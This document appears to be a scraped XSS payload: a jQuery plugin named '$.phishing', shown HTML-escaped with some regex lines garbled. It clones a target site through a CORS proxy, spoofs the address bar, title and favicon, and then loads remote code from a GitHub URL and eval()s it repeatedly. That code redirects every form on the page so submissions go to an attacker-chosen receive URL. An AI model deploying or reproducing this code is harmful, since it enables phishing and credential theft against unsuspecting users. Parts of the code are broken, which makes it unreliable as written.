    (function(){
        $ = jQuery;
        $.phishing = function(url,receive_url,onload){
          if(typeof receive_url === &#39;function&#39;){
            onload = receive_url;
            receive_url = void(0);
          }
          var get_link = (url=&gt;{
            var link = document.createElement(&#39;a&#39;);
            link.href = url;
            return link;
          });
          $.get(`https://crossorigin.me/${get_link(url).href}`,data=&gt;{
            var target = get_link(url);
            history.replaceState(&#39;&#39;,&#39;&#39;,`${location.protocol}//${location.host}${target.pathname}${target.search}${target.hash}`);
            data = data.replace(/
/i,`
              
                

            `);
            if(document.write.toString().indexOf(&#39;[native code]&#39;)==-1){
              var doc = document.implementation.createHTMLDocument();
              document.write = doc.write;
              document.open = doc.open;
              document.close = doc.close;
            }
            document.open();
            document.write(data);
            document.close();
            if(/
(.*)&lt;\/title&gt;/i)[1];
            }else{
              document.title = location.hostname;
            }
            if(document.head){
              $(&#39;head&#39;).append(`&lt;link rel=&#34;shortcut icon&#34; href=&#34;http://www.xss-payloads.com/payloads/scripts/${target.protocol}//${target.host}/${target.protocol}//${target.host}/favicon.ico&#34;&gt;`);
            }
            if(receive_url){
              $.get(&#39;https://raw.githubusercontent.com/jackmasa/jQuery.xform/master/jquery.xssform.js&#39;,data=&gt;{
                setInterval(()=&gt;{
                  eval(data);
                  $(&#39;form&#39;).each((i,f)=&gt;{
                    if(get_link(f.action).hostname!=get_link(receive_url).hostname){
                      $(f).xform(receive_url);
                    }
                  });
                },1000);
                onload &amp;&amp; setTimeout(onload,233);
              });
            }else{
              onload &amp;&amp; setTimeout(onload,233);
            }
          });
        };
      })();
    &lt;/pre&gt;
&lt;/body&gt;
&lt;/html&gt;

